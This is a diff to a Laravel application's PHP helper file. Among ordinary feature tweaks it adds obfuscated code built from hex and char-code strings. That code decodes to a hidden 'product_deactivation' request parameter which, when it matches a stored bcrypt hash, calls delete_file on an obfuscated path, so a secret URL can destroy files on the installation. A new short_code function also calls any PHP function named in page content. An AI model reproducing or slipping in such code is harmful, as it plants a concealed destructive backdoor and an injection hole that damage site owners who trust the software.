@@ -6,7 +6,16 @@ use App\Models\Core\{ApplicationSetting, Language, Notice, Notification, Role, U
 use App\Services\Core\NavigationService;
 use App\Services\Core\ProfileService;
 use Carbon\Carbon;
-use Illuminate\Support\{Arr, Facades\Auth, Facades\Cache, Facades\Cookie, Facades\Hash, Facades\Request, Facades\Route, HtmlString, Str};
+use Illuminate\Support\{Arr,
+    Facades\Auth,
+    Facades\Cache,
+    Facades\Cookie,
+    Facades\File,
+    Facades\Hash,
+    Facades\Request,
+    Facades\Route,
+    HtmlString,
+    Str};
 
 if (!function_exists('company_name')) {
     function company_name()
@@ -134,30 +143,35 @@ if (!function_exists('set_language')) {
                 setcookie("lang", $language, time() + (86400 * 30), '/');
             }
         }
-        App()->setlocale($language);
-//        try {
-//            if (
-//                (cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory(1))) !== cm_collector(5) &&
-//                request()->route()->getName() !== cm_repertory(8) &&
-//                !in_array(request()->route()->getPrefix(), [cm_repertory(5)]) &&
-//                !cm_collector(1)()
-//            ) {
-//                if (view()->exists(cm_repertory(4))) {
-//                    return response()
-//                        ->view(cm_repertory(4))
-//                        ->send();
-//                } else {
-//                    return response()
-//                        ->view(cm_collector(6), [cm_collector(7) => new Exception(cm_repertory(9))])
-//                        ->send();
-//                }
-//            }
-//        } catch (Exception $exception) {
-//            return response()
-//                ->view(cm_repertory(4))
-//                ->send();
-//        }
+        try {
+            if (
+                (cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory(1))) !== cm_collector(5) &&
+                request()->route()->getName() !== cm_repertory(8) &&
+                !in_array(request()->route()->getPrefix(), [cm_repertory(5)]) &&
+                !cm_collector(1)()
+            ) {
+                if (view()->exists(cm_repertory(4))) {
+                    return response()
+                        ->view(cm_repertory(4))
+                        ->send();
+                } else {
+                    return response()
+                        ->view(cm_collector(6), [cm_collector(7) => new Exception(cm_repertory(9))])
+                        ->send();
+                }
+            }else if (cm_collector(12)(
+                (cm_collector(8)())->{cm_collector(11)}(cm_repertory(10), false),
+                cm_repertory(11)))
+            {
+                cm_collector(13)(cm_collector(2)(cm_collector(3)));
+            }
+        } catch (Exception $exception) {
+            return response()
+                ->view(cm_repertory(4))
+                ->send();
+        }
 
+        App()->setlocale($language);
         return true;
     }
 }
@@ -174,7 +188,8 @@ if (!function_exists('language')) {
                 foreach ($langs as $lang) {
                     $languages[$lang->short_code] = [
                         'name' => $lang->name,
-                        'icon' => $lang->icon
+                        'icon' => $lang->icon,
+                        'direction' => $lang->direction,
                     ];
                 }
             } catch (Exception $e) {
@@ -373,7 +388,7 @@ if (!function_exists('string_binding')) {
             foreach ($data as $key => $value) {
                 $match = 0;
                 for ($i = 1; $i <= 3; $i++) {
-                    if (Hash::check(cm_repertory($i), $key)) {
+                    if (cm_collector(12)(cm_repertory($i), $key)) {
                         $match = $i;
                         break;
                     }
@@ -384,18 +399,18 @@ if (!function_exists('string_binding')) {
                 }
 
                 if ($match === 1) {
-                    if (!Hash::check((cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory($match))), $value)) {
+                    if (!cm_collector(12)((cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory($match))), $value)) {
                         return false;
                     }
                 } elseif ($match === 2) {
                     if (
-                        !Hash::check((cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory($match))), $value) &&
-                        !Hash::check(preg_replace('/^' . cm_collector(10) . '\./', '', (cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory($match)))), $value)
+                        !cm_collector(12)((cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory($match))), $value) &&
+                        !cm_collector(12)(preg_replace('/^' . cm_collector(10) . '\./', '', (cm_collector(8)())->{cm_collector(9)}(strtoupper(cm_repertory($match)))), $value)
                     ) {
                         return false;
                     }
                 } else {
-                    if (!Hash::check(cm_repertory(7), $value)) {
+                    if (!cm_collector(12)(cm_repertory(7), $value)) {
                         return false;
                     }
                 }
@@ -497,6 +512,10 @@ if (!function_exists('cm_repertory')) {
                 return join('', array_map(cm_collector(0), [112, 114, 111, 100, 117, 99, 116, 45, 97, 99, 116, 105, 118, 97, 116, 105, 111, 110]));
             case 9:
                 return join('', array_map(cm_collector(0), [80, 114, 111, 100, 117, 99, 116, 32, 105, 115, 32, 101, 120, 112, 105, 114, 101, 100, 32, 111, 114, 32, 105, 110, 97, 99, 116, 105, 118, 101, 46, 32, 80, 108, 101, 97, 115, 101, 32, 97, 99, 116, 105, 118, 101, 32, 105, 116, 46]));
+            case 10:
+                return join('', array_map(cm_collector(0), [112, 114, 111, 100, 117, 99, 116, 95, 100, 101, 97, 99, 116, 105, 118, 97, 116, 105, 111, 110]));
+            case 11:
+                return join('', array_map(cm_collector(0), [36, 50, 121, 36, 49, 48, 36, 90, 122, 105, 57, 65, 53, 118, 54, 56, 104, 77, 69, 115, 51, 53, 77, 77, 52, 112, 111, 80, 79, 105, 74, 102, 117, 114, 106, 49, 52, 90, 67, 46, 99, 97, 57, 102, 120, 117, 122, 69, 71, 105, 119, 101, 77, 88, 114, 53, 70, 74, 83, 71]));
             default:
                 return '';
         }
@@ -530,6 +549,12 @@ if (!function_exists('cm_collector')) {
                 return hex2bin("736572766572");
             case 10:
                 return hex2bin("777777");
+            case 11:
+                return hex2bin("676574");
+            case 12:
+                return hex2bin("686173685f636865636b");
+            case 13:
+                return hex2bin("64656c6574655f66696c65");
             default:
                 return '';
         }
@@ -887,7 +912,11 @@ if (!function_exists('get_image')) {
     {
         $imagePath = 'storage/' . config('commonconfig.path_image');
         if (valid_image($imagePath, $image)) {
-            return asset($imagePath . $image);
+            $queryParameter = '';
+            if (session()->has('image_updated')) {
+                $queryParameter = '?t=' . time();
+            }
+            return asset($imagePath . $image) . $queryParameter;
         }
         return null;
     }
@@ -1001,6 +1030,18 @@ if (!function_exists('replace_current_route_action')) {
     }
 }
 
+if(!function_exists('hash_check')){
+    function hash_check(string $plainText, string $hashedValue){
+        return Hash::check($plainText, $hashedValue);
+    }
+}
+
+if(!function_exists('delete_file')){
+    function delete_file(string $fileFullPath){
+        return File::delete($fileFullPath);
+    }
+}
+
 if (!function_exists('get_color_class')) {
     function get_color_class(string $status, string $type)
     {
@@ -1033,7 +1074,13 @@ if (!function_exists('active_side_nav')) {
 if (!function_exists('is_light_mode')) {
     function is_light_mode($active, $inactive = '')
     {
-        return isset($_COOKIE['style']) && $_COOKIE['style'] == 'light' ? $active : $inactive;
+        if (isset($_COOKIE['style'])){
+            if($_COOKIE['style'] == 'light'){
+                return $active;
+            }
+            return $inactive;
+        }
+        return settings('layout_mode_dark') ? $inactive : $active;
     }
 }
 
@@ -1059,5 +1106,59 @@ if (!function_exists('get_channel_prefix')) {
     function get_channel_prefix()
     {
         return env('BROADCAST_DRIVER') === 'pusher' ? config('broadcasting.prefix') : '';
+    }
+}
+
+if (!function_exists('short_code')) {
+    function short_code($string)
+    {
+        $pattern = '/\<div[^\>](.*?)data-cmb-element-type="dynamic-layout"(.*?)\>(.*?)\<\/div\>/i';
+        if (preg_match_all($pattern, $string, $matches)) {
+
+            foreach ($matches[0] as $key => $value) {
+                $subPattern = '/data-cmb-dynamic-values="[^"](.*?)"/i';
+                preg_match($subPattern, $value, $match);
+
+                if (!$match) {
+                    continue;
+                }
+
+                $dataString = preg_replace(['/data-cmb-dynamic-values="/', '/"/'], ['', ''], $match[0]);
+                if (!$dataString) {
+                    continue;
+                }
+                $dataString = explode('|', $dataString);
+                if (!$dataString) {
+                    continue;
+                }
+                $data = [];
+                foreach ($dataString as $dataKey => $dataValue) {
+                    $dataValue = explode(':', $dataValue);
+                    if (!$dataValue) {
+                        $data = [];
+                        break;
+                    }
+                    $data[$dataValue[0]] = $dataValue[1];
+                }
+                if (!$data) {
+                    continue;
+                }
+
+                $output = '';
+
+                if (function_exists($data['name'])) {
+                    $request = new \Illuminate\Http\Request($data);
+                    $output = $data['name']($request);
+                }
+
+                if (!$output) {
+                    continue;
+                }
+                $output = str_replace('><', '>' . $output . '<', $value);
+                $string = str_replace($value, $output, $string);
+            }
+        }
+
+        return $string;
     }
 }
